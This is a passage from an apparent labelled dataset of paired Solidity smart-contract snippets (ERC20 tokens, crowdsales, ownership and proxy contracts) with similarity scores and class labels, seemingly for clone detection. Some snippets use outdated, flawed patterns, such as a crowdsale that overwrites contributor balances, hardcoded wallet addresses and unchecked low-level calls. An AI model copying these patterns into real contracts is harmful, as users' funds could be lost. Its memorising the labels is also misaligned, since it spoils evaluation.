           totalSupply = INITIAL_SUPPLY;
           balances[msg.sender] = INITIAL_SUPPLY;
          }
         }",0.916253965,"contract BlocksToken is StandardToken {

    string public name = ""Blocks"";
    string public symbol = ""BLOX"";
    uint public decimals = 15;
    uint public INITIAL_SUPPLY = 100000000000000000000000; 

    function BlocksToken() {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
    }
}",1,,,,,
"contract Ownable {
  address public owner;


  
  function Ownable() {
    owner = msg.sender;
  }


  
  modifier onlyOwner() {
    if (msg.sender != owner) {
      throw;
    }
    _;
  }


  
  function transferOwnership(address newOwner) onlyOwner {
    if (newOwner != address(0)) {
      owner = newOwner;
    }
  }

}",0.915166109,"contract Ownable {
    
  address public owner;
 
  
  function Ownable() {
    owner = msg.sender;
  }
 
  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
 
  
  function transferOwnership(address newOwner) onlyOwner {
    require(newOwner != address(0));      
    owner = newOwner;
  }
 
}",1,,,,,
"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  
  function transfer(address _to, uint256 _value) {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
  }

  
  function balanceOf(address _owner) constant returns (uint256 balance) {
    return balances[_owner];
  }

}",0.938556216,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint) balances;

  
  function transfer(address _to, uint _value) public {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
  }

  
  function balanceOf(address _owner) constant public returns (uint balance) {
    return balances[_owner];
  }

}",1,,,,,
"contract Crowdsale {
  using SafeMath for uint256;


  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));

    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
  }



function createTokenContract() internal returns (StandardToken) {
    return new Tokka();
  }


  
  function () external payable {
    buyTokens(msg.sender);
  }

  
function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    
    ERC20(token).transfer(this, tokens); 

    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
}


  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }


  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }


  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

}",0.939600712,"contract Crowdsale {
  using SafeMath for uint256;

  
  MintableToken public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) {
    
    require(_endTime >= _startTime);
    require(_rate > 0);
    

    token = createTokenContract();
    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
  }

  
  
  function createTokenContract() internal returns (MintableToken) {
    return new MintableToken();
  }


  
  function () payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address beneficiary) public payable {
    require(beneficiary != 0x0);
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    token.mint(beneficiary, tokens);
    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
  }

  
  
  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }

  
  function validPurchase() internal constant returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }

  
  function hasEnded() public constant returns (bool) {
    return now > endTime;
  }


}",1,,,,,
"contract TokenERC20 {

string public name;
string public symbol;
uint8 public decimals = 0;

uint256 public totalSupply;


mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) public allowance;


event Transfer(address indexed from, address indexed to, uint256 value);


event Burn(address indexed from, uint256 value);


function TokenERC20(
    uint256 initialSupply,
    string tokenName,
    string tokenSymbol
) public {
    totalSupply = initialSupply * 10 ** uint256(decimals);  
    balanceOf[msg.sender] = totalSupply;                
    name = tokenName;                                   
    symbol = tokenSymbol;                               
}


function _transfer(address _from, address _to, uint _value) internal {
    
    require(_to != 0x0);
    
    require(balanceOf[_from] >= _value);
    
    require(balanceOf[_to] + _value > balanceOf[_to]);
    
    uint previousBalances = balanceOf[_from] + balanceOf[_to];
    
    balanceOf[_from] -= _value;
    
    balanceOf[_to] += _value;
    Transfer(_from, _to, _value);
    
    assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
}


function transfer(address _to, uint256 _value) public {
    _transfer(msg.sender, _to, _value);
}


function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= allowance[_from][msg.sender]);     
    allowance[_from][msg.sender] -= _value;
    _transfer(_from, _to, _value);
    return true;
}


function approve(address _spender, uint256 _value) public
    returns (bool success) {
    allowance[msg.sender][_spender] = _value;
    return true;
}


function approveAndCall(address _spender, uint256 _value, bytes _extraData)
    public
    returns (bool success) {
    tokenRecipient spender = tokenRecipient(_spender);
    if (approve(_spender, _value)) {
        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }
}


function burn(uint256 _value) public returns (bool success) {
    require(balanceOf[msg.sender] >= _value);   
    balanceOf[msg.sender] -= _value;            
    totalSupply -= _value;                      
    Burn(msg.sender, _value);
    return true;
}


function burnFrom(address _from, uint256 _value) public returns (bool success) {
    require(balanceOf[_from] >= _value);                
    require(_value <= allowance[_from][msg.sender]);    
    balanceOf[_from] -= _value;                         
    allowance[_from][msg.sender] -= _value;             
    totalSupply -= _value;                              
    Burn(_from, _value);
    return true;
}
}",0.99854121,"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0,,,,,
"contract Owned {

address public owner;   

event TransferOwnerShip(address oldaddr, address newaddr);


modifier onlyOwner {require(msg.sender == owner);_;}


function Owned() public {
    owner = msg.sender;
}

function transferOwnership(address newOwner) onlyOwner public {
    address oldaddr = owner;
    owner = newOwner;
    TransferOwnerShip(oldaddr, owner);
}
}",0.904838182,"contract Migrations {
    address public owner;

    event TransferOwnership(address oldaddr, address newaddr);

    modifier onlyOwner() { require(msg.sender == owner); _; }

    function Migrations() public {
        owner = msg.sender;
    }

    function transferOwnership(address _new) onlyOwner public {
        address oldaddr = owner;
        owner = _new;
        emit TransferOwnership(oldaddr, owner);
    }
}",1,,,,,
"contract Token {

  

  function transfer(address _to, uint256 _value) returns (bool success) {}

  
}",0.957569046,"contract Token {
    function transfer(address _to, uint _value) returns (bool success);
}",2,,,,,
"contract Crowdsale {
address public beneficiary;
uint public fundingGoal; uint public amountRaised; uint public deadline; uint public price;
token public tokenReward;
mapping(address => uint256) public balanceOf;
bool fundingGoalReached = false;
event GoalReached(address beneficiary, uint amountRaised);
event FundTransfer(address backer, uint amount, bool isContribution);
bool crowdsaleClosed = false;




function Crowdsale(
    address ifSuccessfulSendTo,
    uint fundingGoalInEthers,
    uint durationInMinutes,
    uint weiCostOfEachToken,
    token addressOfTokenUsedAsReward
) {
    beneficiary = ifSuccessfulSendTo;
    fundingGoal = fundingGoalInEthers * 1 ether;
    deadline = now + durationInMinutes * 1 minutes;
    price = weiCostOfEachToken * 1 wei;
    tokenReward = token(addressOfTokenUsedAsReward);
}


function () payable {
    if (crowdsaleClosed) throw;
    uint amount = msg.value;
    balanceOf[msg.sender] = amount;
    amountRaised += amount;
    tokenReward.transfer(msg.sender, amount / price);
    FundTransfer(msg.sender, amount, true);
}

modifier afterDeadline() { if (now >= deadline) _; }


function checkGoalReached() afterDeadline {
    if (amountRaised >= fundingGoal){
        fundingGoalReached = true;
        GoalReached(beneficiary, amountRaised);
    }
    crowdsaleClosed = true;
}


function safeWithdrawal() afterDeadline {
    if (!fundingGoalReached) {
        uint amount = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        if (amount > 0) {
            if (msg.sender.send(amount)) {
                FundTransfer(msg.sender, amount, false);
            } else {
                balanceOf[msg.sender] = amount;
            }
        }
    }

    if (fundingGoalReached && beneficiary == msg.sender) {
        if (beneficiary.send(amountRaised)) {
            FundTransfer(beneficiary, amountRaised, false);
        } else {
            
            fundingGoalReached = false;
        }
    }
}
",0.974920169,"contract Crowdsale {
    address public beneficiary;
    uint public fundingGoal;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool fundingGoalReached = false;
    bool crowdsaleClosed = false;

    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function Crowdsale(
        address ifSuccessfulSendTo,
        uint fundingGoalInEthers,
        uint durationInMinutes,
        uint etherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) {
        beneficiary = ifSuccessfulSendTo;
        fundingGoal = fundingGoalInEthers * 1 ether;
        deadline = now + durationInMinutes * 1 minutes;
        price = etherCostOfEachToken * 1 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    
    function () payable {
        require(!crowdsaleClosed);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount / price);
        FundTransfer(msg.sender, amount, true);
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function checkGoalReached() afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }


    
    function safeWithdrawal() afterDeadline {
        if (!fundingGoalReached) {
            uint amount = balanceOf[msg.sender];
            balanceOf[msg.sender] = 0;
            if (amount > 0) {
                if (msg.sender.send(amount)) {
                    FundTransfer(msg.sender, amount, false);
                } else {
                    balanceOf[msg.sender] = amount;
                }
            }
        }

        if (fundingGoalReached && beneficiary == msg.sender) {
            if (beneficiary.send(amountRaised)) {
                FundTransfer(beneficiary, amountRaised, false);
            } else {
                
                fundingGoalReached = false;
            }
        }
    }
}",1,,,,,
"contract owned {
    function owned() { owner = msg.sender; }
    address owner;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}",0.963088779,"contract Owned {

    
    address owner;

    
    function Owned() {
        owner = msg.sender;
    }

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}",1,,,,,
"contract mortal is owned {

    function close() onlyOwner {
        selfdestruct(owner);
    }
}",0.930573634,"contract mortal is owned {
    
    function kill() onlyOwner {
        selfdestruct(owner);
    }
}",1,,,,,
"contract TokenHeaven is StandardToken {

    function () {
        throw;
    }

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0';    

    function TokenHeaven() {
        balances[msg.sender] = 180000000000000000000000000;
        totalSupply = 180000000000000000000000000;
        name = ""TokenHeaven"";
        decimals = 18;
        symbol = ""THV"";
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",0.945966793,"contract ERC20Token is StandardToken {

    function () {
        
        throw;
    }

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = &#39;H1.0&#39;;       


    function ERC20Token(
        ) {
        balances[msg.sender] = 64000000000000000000000000;               
        totalSupply = 64000000000000000000000000;                        
        name = ""Open Token"";                                   
        decimals = 18;                            
        symbol = ""OPN"";                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",1,,,,,
"contract ShahzadTestCoin is StandardToken { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           

    
    
    function ShahzadTestCoin() {
        balances[msg.sender] = 1000000000000000000000;               
        totalSupply = 1000000000000000000000;                        
        name = ""ShahzadTestCoin"";                                   
        decimals = 18;                                               
        symbol = ""STCN"";                                             
        unitsOneEthCanBuy = 10;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[fundsWallet] >= amount);

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",0.958082837,"contract CoinNewsChannel is StandardToken { 



    

    string public name;                   

    uint8 public decimals;                

    string public symbol;                

    string public version = 'H1.0'; 

    uint256 public unitsOneEthCanBuy;     

    uint256 public totalEthInWei;         

    address public fundsWallet;          



    function CoinNewsChannel() {

        balances[msg.sender] = 1000000000000000000000000;              

        totalSupply = 1000000000000000000000000;                        

        name = ""CoinNewsChannel"";                                   

        decimals = 18;                                               

        symbol = ""SCNCT"";                                             

        unitsOneEthCanBuy = 1000;                                     

        fundsWallet = msg.sender;                                   

    }



    function() payable{

        totalEthInWei = totalEthInWei + msg.value;

        uint256 amount = msg.value * unitsOneEthCanBuy;

        require(balances[fundsWallet] >= amount);



        balances[fundsWallet] = balances[fundsWallet] - amount;

        balances[msg.sender] = balances[msg.sender] + amount;



        Transfer(fundsWallet, msg.sender, amount); 



        

        fundsWallet.transfer(msg.value);                               

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }

        return true;

    }

}",1,,,,,
"contract Crowdsale {
  using SafeMath for uint256;
  using SafeERC20 for ERC20;

  
  ERC20 public token;

  
  address public wallet;

  
  
  
  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(
    address indexed purchaser,
        address indexed beneficiary,
    uint256 value,
    uint256 amount
  );

  
  constructor(uint256 _rate, address _wallet, ERC20 _token) public {
    require(_rate > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    rate = 8 * (10**8);
    wallet = 0xF76075Cf3B674fB9656E393e9e17091B01243666;
    token = token = ERC20(0x0f26c1c05f1bbBC7Eff0488F1a98619e8a9758cf);
  }

  
  
  

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address _beneficiary) public payable {

    uint256 weiAmount = msg.value;
    _preValidatePurchase(_beneficiary, weiAmount);

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(
      msg.sender,
      _beneficiary,
      weiAmount,
      tokens
    );

    _updatePurchasingState(_beneficiary, weiAmount);

    _forwardFunds();
    _postValidatePurchase(_beneficiary, weiAmount);
  }

  
  
  

  
  function _preValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    require(_beneficiary != address(0));
    require(_weiAmount != 0);
  }

  
  function _postValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    token.safeTransfer(_beneficiary, _tokenAmount);
  }

  
  function _processPurchase(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

  
  function _updatePurchasingState(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _getTokenAmount(uint256 _weiAmount)
    internal view returns (uint256)
  {
    return _weiAmount.mul(rate);
  }

  
  function _forwardFunds() internal {
    wallet.transfer(msg.value);
  }
}",0.949423049,"contract Crowdsale {
  using SafeMath for uint256;
  using SafeERC20 for ERC20;

  
  ERC20 public token;

  
  address public wallet;

  
  
  
  
  uint256 public rate;
  uint256 public divisor;

  
  uint256 public weiRaised;

  
  event TokenPurchase(
    address indexed purchaser,
    address indexed beneficiary,
    uint256 value,
    uint256 amount
  );

  
  constructor(uint256 _rate, uint256 _divisor, address _wallet, ERC20 _token) public {
    require(_rate > 0);
    require(_divisor > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    rate = _rate;
    divisor = _divisor;
    wallet = _wallet;
    token = _token;
  }

  
  
  

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address _beneficiary) public payable {

    uint256 weiAmount = msg.value;
    _preValidatePurchase(_beneficiary, weiAmount);

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(
      msg.sender,
      _beneficiary,
      weiAmount,
      tokens
    );

    _updatePurchasingState(_beneficiary, weiAmount);

    _forwardFunds();
    _postValidatePurchase(_beneficiary, weiAmount);
  }

  
  
  

  
  function _preValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    require(_beneficiary != address(0));
    require(_weiAmount != 0);
  }

  
  function _postValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    token.safeTransfer(_beneficiary, _tokenAmount);
  }

  
  function _processPurchase(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

  
  function _updatePurchasingState(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _getTokenAmount(uint256 _weiAmount)
    internal view returns (uint256)
  {
    return _weiAmount.mul(rate);
  }

  
  function _forwardFunds() internal {
    wallet.transfer(msg.value);
  }
}",1,,,,,
"contract Ownable {
  address public owner;


  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


  
  function Ownable() public {
    owner = msg.sender;
  }


  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }


  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

}",0.963315619,"contract Ownable {

  address public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  

  constructor() public{

    owner = msg.sender;

  }

  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

  

  function transferOwnership(address newOwner) onlyOwner public {

    require(newOwner != address(0));

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

  }

}",1,,,,,
"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }
}",0.922140066,"contract TokenERC20{

    using SafeMath for uint256;



    string public name;

    string public symbol;

    uint8 public decimals = 18;

    uint256 public totalSupply;



    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    event Transfer(address indexed from, address indexed to, uint256 value);

    

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



    event Burn(address indexed from, uint256 value);



    

    constructor(uint256 initialSupply,string memory tokenName,string memory tokenSymbol) public {

        totalSupply = initialSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;                

        name = tokenName;                                  

        symbol = tokenSymbol;                              

    }



    

    function _transfer(address _from, address _to, uint _value) internal {

        require(_to != address(0x0));



        balanceOf[_from] = balanceOf[_from].sub(_value);

        balanceOf[_to] = balanceOf[_to].add(_value);



        emit Transfer(_from, _to, _value);

    }



    

    function transfer(address _to, uint256 _value) public returns (bool success) {

        _transfer(msg.sender, _to, _value);

        return true;

    }



   

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);

        _transfer(_from, _to, _value);

        return true;

    }



   

    function approve(address _spender, uint256 _value) public

        returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



   

    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData)

        public

        returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, address(this), _extraData);

            return true;

        }

    }



   

    function burn(uint256 _value) public returns (bool success) {

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);             

        totalSupply = totalSupply.sub(_value);                                 

        emit Burn(msg.sender, _value);

        return true;

    }



    

    function burnFrom(address _from, uint256 _value) public returns (bool success) {

        balanceOf[_from] = balanceOf[_from].sub(_value);                                        

        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);                

        totalSupply = totalSupply.sub(_value);                                                  

        emit Burn(_from, _value);

        return true;

    }



}",2,,,,,
"contract owned {
  address public owner;
  constructor () public {
    owner=msg.sender;
  }

  modifier onlyOwner {
    require (msg.sender == owner);
    _;
  }
}",0.935497507,"contract Ownable {

  address public owner;



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

}",1,,,,,
"contract Coursetro {

string fName;
uint age;

function setInstructor(string _fName, uint _age) public {
    fName = _fName;
    age = _age;
}

function getInstructor() public constant returns (string, uint) {
    return (fName, age);
}
}",0.902201178,"contract InfoContract {
    
   string fName;
   uint age;
   
   function setInfo(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInfo() public constant returns (string, uint) {
       return (fName, age);
   }   
}",1,,,,,
"contract MyERC20TokenSale {
address payable admin;
MyERC20Token public tokenContract;
uint256 public tokenPrice;
uint256 public tokensSold;

event Sell(address _buyer, uint256 _amount);

constructor(MyERC20Token _tokenContract, uint256 _tokenPrice) public {
    admin = msg.sender;
    tokenContract = _tokenContract;
    tokenPrice = _tokenPrice;
}

function multiply(uint x, uint y) internal pure returns (uint z) {
    require(y == 0 || (z = x * y) / y == x);
}

function buyTokens(uint256 _numberOfTokens) public payable {
    require(msg.value == multiply(_numberOfTokens, tokenPrice));
    require(tokenContract.balanceOf(address(this)) >= _numberOfTokens);
    require(tokenContract.transfer(msg.sender, _numberOfTokens));

    tokensSold += _numberOfTokens;

    emit Sell(msg.sender, _numberOfTokens);
}

function endSale() public {
    require(msg.sender == admin);
    require(tokenContract.transfer(admin, tokenContract.balanceOf(address(this))));

    admin.transfer(address(this).balance);
}
 }",0.922141785,"contract StephenZhengTokenSale {

    address admin;

    StephenZhengToken public tokenContract;

    uint256 public tokenPrice;

    uint256 public tokensSold;



    event Sell(address _buyer, uint256 _amount);



    function StephenZhengTokenSale(StephenZhengToken _tokenContract, uint256 _tokenPrice) public {

        admin = msg.sender;

        tokenContract = _tokenContract;

        tokenPrice = _tokenPrice;

    }



    function multiply(uint x, uint y) internal pure returns (uint z) {

        require(y == 0 || (z = x * y) / y == x);

    }



    function buyTokens(uint256 _numberOfTokens) public payable {

        require(msg.value == multiply(_numberOfTokens, tokenPrice));

        require(tokenContract.balanceOf(this) >= _numberOfTokens);

        require(tokenContract.transfer(msg.sender, _numberOfTokens));



        tokensSold += _numberOfTokens;



        emit Sell(msg.sender, _numberOfTokens);

    }



    function endSale() public {

        require(msg.sender == admin);

        require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));



        selfdestruct(admin);

    }

}",2,,,,,
"contract Proxy is Ownable {

    event Upgraded(address indexed implementation);

    address internal _implementation;

    function implementation() public view returns (address) {
        return _implementation;
    }

    function upgradeTo(address impl) public onlyOwner {
        require(_implementation != impl);
        _implementation = impl;
        emit Upgraded(impl);
    }

    function () payable public {
        address _impl = implementation();
        require(_impl != address(0));
        bytes memory data = msg.data;

        assembly {
            let result := delegatecall(gas, _impl, add(data, 0x20), mload(data), 0, 0)
            let size := returndatasize
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)
            switch result
            case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }
}",0.983323053,"contract Token is Ownable {

  event UpgradedTo(address indexed implementation);



  address internal _implementation;



  function implementation() public view returns (address) {

    return _implementation;

  }



  function upgradeTo(address impl) public onlyOwner {

    require(_implementation != impl);

    _implementation = impl;

    emit UpgradedTo(impl);

  }



  function () payable public {

    address _impl = implementation();

    require(_impl != address(0));

    bytes memory data = msg.data;



    assembly {

      let result := delegatecall(gas, _impl, add(data, 0x20), mload(data), 0, 0)

      let size := returndatasize

      let ptr := mload(0x40)

      returndatacopy(ptr, 0, size)

